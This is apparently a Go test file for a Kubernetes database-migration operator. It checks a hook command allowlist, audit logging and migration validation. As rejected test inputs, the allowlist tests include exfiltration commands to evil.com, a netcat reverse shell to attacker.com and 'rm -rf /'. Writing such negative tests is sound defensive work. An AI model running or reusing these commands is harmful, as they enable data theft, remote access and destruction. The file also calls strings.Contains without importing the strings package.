package quiesce

import (
	"context"
	"testing"
	"time"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	v1alpha1 "github.com/aegis-migrate/portage/api/v1alpha1"
)

func TestHookAllowlist_PostgreSQL(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"psql -c 'CHECKPOINT'", true},
		{"PSQL -c 'SELECT 1'", true},
		{"pg_dump -Fc dbname", true},
		{"pg_restore -d dbname dumpfile", true},
		{"pg_basebackup -D /backup", true},
		{"checkpoint", true},
		{"backup_start", true},
		{"backup_stop", true},
		{"wal_backup", true},
		{"bash -c 'rm -rf /'", false},
		{"curl http://evil.com/exfil", false},
		{"wget http://evil.com/data", false},
		{"nc -e /bin/sh attacker.com 4444", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("postgresql", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(postgresql, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_MySQL(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"mysql -e 'FLUSH TABLES'", true},
		{"mysqldump --all-databases", true},
		{"mysqladmin flush-tables", true},
		{"mysql -e 'LOCK TABLES'", true},
		{"mysql -e 'UNLOCK TABLES'", true},
		{"bash", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("mysql", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(mysql, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_MongoDB(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"mongo --eval 'fsyncLock'", true},
		{"mongodump --archive=/backup/dump.gz", true},
		{"mongorestore --archive=/backup/dump.gz", true},
		{"fsync", true},
		{"lock", true},
		{"unlock", true},
		{"rm -rf /data", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("mongodb", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(mongodb, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_CustomDB(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	allowlist.Custom["customdb"] = []string{"custom-tool", "backup.sh"}

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"custom-tool --backup", true},
		{"BACKUP.SH /data", true},
		{"rm -rf /", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("customdb", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(customdb, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_NoAllowlist(t *testing.T) {
	allowlist := &HookAllowlist{
		PostgreSQL: nil,
		Custom:     make(map[string][]string),
	}

	if !allowlist.IsAllowed("unknown_db", "any command") {
		t.Error("expected all commands to be allowed when no allowlist defined")
	}
}

func TestAuditHookExecutor_SkipNonAllowlisted(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	mockExec := &MockHookExecutor{}

	auditExec := NewAuditHookExecutor(mockExec, allowlist, "postgresql")

	migration := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceNamespace: "test-ns",
			PreQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "evil-hook", Type: v1alpha1.HookTypePodExec, PodExec: &v1alpha1.PodExecHook{
					Command: []string{"bash", "-c", "rm -rf /"},
				}},
			},
		},
	}

	err := auditExec.ExecutePreQuiesce(context.Background(), migration)
	if err == nil {
		t.Fatal("expected error for non-allowlisted command")
	}
	if len(auditExec.auditLog.entries) == 0 {
		t.Fatal("expected audit log entry")
	}
	entry := auditExec.auditLog.entries[0]
	if entry.Status != "skipped" {
		t.Errorf("expected status 'skipped', got %q", entry.Status)
	}
	if entry.Allowlisted {
		t.Error("expected allowlisted=false for non-allowlisted command")
	}
}

func TestAuditHookExecutor_AllowAllowlisted(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	mockExec := &MockHookExecutor{}

	auditExec := NewAuditHookExecutor(mockExec, allowlist, "postgresql")

	migration := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceNamespace: "test-ns",
			PreQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "good-hook", Type: v1alpha1.HookTypePodExec, PodExec: &v1alpha1.PodExecHook{
					Command: []string{"psql", "-c", "CHECKPOINT;"},
				}},
			},
		},
	}

	err := auditExec.ExecutePreQuiesce(context.Background(), migration)
	if err != nil {
		t.Fatalf("expected success for allowlisted command, got: %v", err)
	}
	if len(auditExec.auditLog.entries) == 0 {
		t.Fatal("expected audit log entry")
	}
	entry := auditExec.auditLog.entries[0]
	if entry.Status != "success" {
		t.Errorf("expected status 'success', got %q", entry.Status)
	}
}

func TestHookAuditLog_RecordAndRetrieve(t *testing.T) {
	log := NewHookAuditLog()

	entry1 := HookAuditEntry{
		Name:        "test-hook",
		Namespace:   "test-ns",
		StartTime:   time.Now(),
		Allowlisted: true,
		Status:      "success",
	}
	log.Record(entry1)

	entries := log.Entries()
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Name != "test-hook" {
		t.Errorf("expected name 'test-hook', got %q", entries[0].Name)
	}

	latest := log.Latest()
	if latest == nil {
		t.Fatal("expected non-nil latest")
	}
	if latest.Name != "test-hook" {
		t.Errorf("expected latest name 'test-hook', got %q", latest.Name)
	}

	log.Record(HookAuditEntry{Name: "second-hook"})
	if len(log.Entries()) != 2 {
		t.Fatalf("expected 2 entries after second record, got %d", len(log.Entries()))
	}
}

func TestPGQuiescence_PreQuiesce(t *testing.T) {
	pg := NewPGQuiescence()
	if pg.MinBackupDuration != 2*time.Second {
		t.Errorf("expected MinBackupDuration 2s, got %v", pg.MinBackupDuration)
	}
	if pg.MaxBackupWait != 30*time.Second {
		t.Errorf("expected MaxBackupWait 30s, got %v", pg.MaxBackupWait)
	}
}

func TestHookCommand_PodExec(t *testing.T) {
	hook := v1alpha1.QuiescenceHook{
		PodExec: &v1alpha1.PodExecHook{
			Command: []string{"psql", "-c", "CHECKPOINT;"},
		},
	}
	got := HookCommand(hook)
	if got != "psql" {
		t.Errorf("expected 'psql', got %q", got)
	}
}

func TestHookCommand_HTTP(t *testing.T) {
	hook := v1alpha1.QuiescenceHook{
		HTTP: &v1alpha1.HTTPHook{
			Method: "POST",
			URL:    "http://localhost:8080/health",
		},
	}
	got := HookCommand(hook)
	if got != "POST http://localhost:8080/health" {
		t.Errorf("expected 'POST http://localhost:8080/health', got %q", got)
	}
}

func TestHookCommand_Empty(t *testing.T) {
	hook := v1alpha1.QuiescenceHook{}
	got := HookCommand(hook)
	if got != "" {
		t.Errorf("expected empty string, got %q", got)
	}
}

func TestValidateMigration_Valid(t *testing.T) {
	m := &v1alpha1.PortageMigration{
		ObjectMeta: metav1.ObjectMeta{Name: "test-migration"},
		Spec: v1alpha1.PortageMigrationSpec{
			SourceWorkload:   corev1.TypedLocalObjectReference{Kind: "StatefulSet", Name: "postgres"},
			SourceNamespace:  "source-ns",
			TargetNamespace:  "target-ns",
			VolumeMigration: v1alpha1.VolumeMigrationSpec{
				VolumeSnapshotClassName:    "csi-aws-vsc",
				TargetStorageClassName:     "fast-nvme-sc",
				PersistentVolumeClaimNames: []string{"data-pvc"},
			},
			CDCReplication: &v1alpha1.CDCReplicationSpec{
				Enabled:                 true,
				Endpoint:                "http://cdc:8080",
				StreamID:                "stream-1",
				RequireMerkleVerification: true,
			},
			TrafficCutover: &v1alpha1.TrafficCutoverSpec{
				Enabled:          true,
				DirectorEndpoint: "http://ghostwire:8080",
				RouteID:          "route-1",
				TargetEndpoint:   "target:5432",
			},
			PreQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "flush-db", Type: v1alpha1.HookTypePodExec},
			},
			PostQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "unlock-db", Type: v1alpha1.HookTypePodExec},
			},
		},
	}

	result := ValidateMigration(m)
	if !result.Valid {
		t.Fatalf("expected valid, got errors: %v", result.Errors)
	}
	if len(result.Warnings) == 0 {
		t.Fatal("expected warnings about AST translation")
	}
	if result.Summary == "" {
		t.Fatal("expected non-empty summary")
	}
	t.Logf("Summary: %s", result.Summary)
}

func TestValidateMigration_MissingRequiredFields(t *testing.T) {
	m := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			// Missing all required fields
		},
	}

	result := ValidateMigration(m)
	if result.Valid {
		t.Fatal("expected invalid, got valid")
	}
	if len(result.Errors) < 3 {
		t.Fatalf("expected at least 3 errors, got %d: %v", len(result.Errors), result.Errors)
	}
}

func TestValidateMigration_CDCMissingEndpoint(t *testing.T) {
	m := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceWorkload:  corev1.TypedLocalObjectReference{Kind: "StatefulSet", Name: "pg"},
			SourceNamespace: "ns",
			TargetNamespace: "ns2",
			VolumeMigration: v1alpha1.VolumeMigrationSpec{
				VolumeSnapshotClassName: "sc",
			},
			CDCReplication: &v1alpha1.CDCReplicationSpec{
				Enabled:  true,
				StreamID: "s1",
			},
		},
	}

	result := ValidateMigration(m)
	if result.Valid {
		t.Fatal("expected invalid due to missing CDC endpoint")
	}
	if len(result.Errors) == 0 || result.Errors[0] != "cdcReplication.endpoint is required when CDC is enabled" {
		t.Fatalf("unexpected error: %v", result.Errors)
	}
}

func TestValidateMigration_CutoverMissingEndpoint(t *testing.T) {
	m := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceWorkload:  corev1.TypedLocalObjectReference{Kind: "StatefulSet", Name: "pg"},
			SourceNamespace: "ns",
			TargetNamespace: "ns2",
			VolumeMigration: v1alpha1.VolumeMigrationSpec{
				VolumeSnapshotClassName: "sc",
			},
			TrafficCutover: &v1alpha1.TrafficCutoverSpec{
				Enabled: true,
			},
		},
	}

	result := ValidateMigration(m)
	if result.Valid {
		t.Fatal("expected invalid due to missing cutover endpoints")
	}
}

func TestFormatResult(t *testing.T) {
	result := &DryRunResult{
		Valid:   false,
		Errors:  []string{"err1"},
		Warnings: []string{"warn1"},
		Summary: "test summary",
	}

	output := FormatResult(result)
	if !strings.Contains(output, "INVALID") {
		t.Fatal("expected INVALID in output")
	}
	if !strings.Contains(output, "ERROR: err1") {
		t.Fatal("expected error in output")
	}
	if !strings.Contains(output, "WARNING: warn1") {
		t.Fatal("expected warning in output")
	}
}

func TestValidateMigration_EmptyPVCsWithSnapshotClass(t *testing.T) {
	m := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceWorkload:  corev1.TypedLocalObjectReference{Kind: "StatefulSet", Name: "pg"},
			SourceNamespace: "ns",
			TargetNamespace: "ns2",
			VolumeMigration: v1alpha1.VolumeMigrationSpec{
				VolumeSnapshotClassName:    "sc",
				PersistentVolumeClaimNames: []string{},
			},
		},
	}

	result := ValidateMigration(m)
	if !result.Valid {
		t.Fatalf("expected valid (empty PVCs with snapshot class is a warning, not error), got errors: %v", result.Errors)
	}
	found := false
	for _, w := range result.Warnings {
		if strings.Contains(w, "empty") {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected warning about empty PVCs, got warnings: %v", result.Warnings)
	}
}
